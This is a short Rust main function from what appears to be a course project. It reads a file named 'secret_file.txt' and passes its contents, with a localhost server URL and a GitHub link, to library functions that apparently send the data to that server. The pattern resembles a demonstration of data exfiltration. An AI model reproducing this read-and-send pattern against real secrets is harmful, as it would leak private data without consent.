use std::fs::File;
use std::io::BufReader;
use P3::*;

#[tokio::main]
async fn main() {
    // Specify the file path, server URL, and GitHub link
    let file_path = "secret_file.txt";
    let server_url = "https://127.0.0.1";
    let github_link = "https://github.com/lyssairene/Project3";

    // Open the file and create a BufReader
    let file = File::open(file_path).expect("Failed to open file");
    let reader = BufReader::new(file);

    // Scan the system asynchronously to read the contents of the file
    if let Ok(data) = scan_system(reader).await {
        // Run the process with the obtained data
        match run_process(data, server_url, github_link).await {
            // Print success message if the process completes successfully
            Ok(_) => println!("Process completed successfully."),
            // Print error message if the process encounters an error
            Err(e) => eprintln!("Error: {}", e),
        }
    } else {
        // Print error message if failed to read the file
        eprintln!("Failed to read file.");
    }
}
